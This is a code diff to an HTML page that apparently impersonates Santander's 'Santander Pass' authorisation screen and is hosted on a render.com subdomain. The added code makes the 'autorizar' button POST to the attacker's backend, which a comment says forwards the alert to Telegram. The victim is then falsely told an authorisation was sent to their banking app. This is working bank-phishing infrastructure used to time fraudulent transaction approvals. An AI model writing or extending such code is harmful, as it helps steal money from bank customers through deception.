@@ -35,6 +35,7 @@
 
   <script>
     const API_URL = "https://autorizaci-n-coordenadas-o-pass.onrender.com/config";
+    const AUTORIZAR_URL = "https://autorizaci-n-coordenadas-o-pass.onrender.com/autorizar";
 
     document.addEventListener("DOMContentLoaded", () => {
       const seleccion = localStorage.getItem("seleccionProducto");
@@ -44,7 +45,6 @@
         .then(data => {
           let producto = "";
 
-          // Ahora no hay valores predefinidos, solo lo que venga del admin
           if(seleccion === "linea"){
             producto = data.producto1 || "";
           } else if(seleccion === "tarjeta"){
@@ -60,16 +60,22 @@
     });
 
     document.getElementById("autorizarBtn").addEventListener("click", async () => {
-      // Aquí puedes enviar la autorización al backend si lo deseas
-      // Ejemplo:
-      // await fetch("/autorizar", {
-      //   method: "POST",
-      //   headers: { "Content-Type": "application/json" },
-      //   body: JSON.stringify({ mensaje: "Autorización enviada por Santander Pass" })
-      // });
+      try {
+        // Enviar notificación al backend para que llegue a Telegram
+        await fetch(AUTORIZAR_URL, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ mensaje: "Autorizar" })
+        });
 
-      document.getElementById("mensajeAutorizacion").innerText = 
-        "Hemos enviado una autorización a tu App Santander Pass";
+        // Mostrar mensaje en rojo en pantalla
+        document.getElementById("mensajeAutorizacion").innerText = 
+          "Hemos enviado una autorización a tu App Santander Pass";
+      } catch (error) {
+        console.error("Error al enviar autorización:", error);
+        document.getElementById("mensajeAutorizacion").innerText = 
+          "⚠️ No se pudo enviar la autorización.";
+      }
     });
   </script>
 </body>
